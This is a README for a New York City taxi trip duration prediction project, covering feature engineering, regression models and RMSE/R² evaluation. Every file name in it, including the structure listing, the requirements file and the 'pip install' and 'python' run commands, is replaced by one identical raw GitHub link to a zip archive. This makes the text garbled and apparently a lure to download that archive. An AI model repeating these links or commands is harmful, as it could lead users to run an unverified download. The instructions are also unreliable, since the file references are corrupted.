<pre>
🗽 NYC Taxi Trip Duration Prediction

This project predicts taxi trip duration in New York City using machine learning. The dataset comes from the Kaggle competition
[data link] https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip

📂 Project Structure

├── trip-duration https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip   # Exploratory Data Analysis & feature engineering

├── https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip                   # Training script (model building & saving)

├── https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip                   # Evaluation script on unseen test data

├──https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip                # the evaluations of models on train/test

├──https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip                 # show the difference between real target values and predicted values (in log scale!)

├──Data (split & prcessed data)

├──model_dict (scaler,kmeans,encode,model,https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip)

⚙️ Workflow

1 - EDA & Feature Engineering (trip-duration https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip)

-Convert datetime into month, hour, weekday.

-Add is_weekend, jam_hour (rush hour indicator).

-Compute geospatial features:

1-haversine_distance (pickup → dropoff straight-line distance).

2-bearing, euclidean_distance, manhattan_distance (optional).

3-pickup_cluster and drop_off cluster

4-average trip duration per every cluster pairs

-One-Hot Encode categorical features (passenger_count, vendor_id, etc.).

-Apply log transformation: log_trip_duration = log(1+trip_duration)

2 - Model Training (https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip)

-Prepares training & validation sets.

-Applies scaling (StandardScaler or MinMaxScaler).

-Trains regression models (Ridge, RandomForest, XGBoost).

-Saves the best model (https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip) along with preprocessing objects (https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip, https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip).

3 - Model Evaluation (https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip)

-Loads the trained model, encoder, and scaler.

-Applies the same feature engineering pipeline on new test data.

-Evaluates using RMSE and R² metrics on log_trip_duration.

🧮 Features Used

-Datetime features: pickup month, hour, weekday, weekend indicator, rush-hour flag.

-Geospatial features: pickup/dropoff coordinates, haversine distance , pickup & dropoff cluster , average trip duration per every cluster pairs.

-Categorical features (OHE): passenger count, vendor ID, store-and-forward flag, month, hour, weekday.

-Target variable: log_trip_duration.

📊 Metrics

-The project evaluates performance using:

-RMSE (Root Mean Squared Error)

-R² Score (Coefficient of Determination)

-Both computed on the log-transformed target .

🚀 How to Run

1 - Install requirements:

-pip install -r https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip

(or manually: pandas numpy scikit-learn matplotlib seaborn xgboost joblib)


2 - Run training:

-python https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip


3 - Run evaluation on test set:

-python https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip

📌 Next Steps

-Hyperparameter tuning (RandomForest / XGBoost).
-Consider traffic/weather data for more accuracy.
</pre>

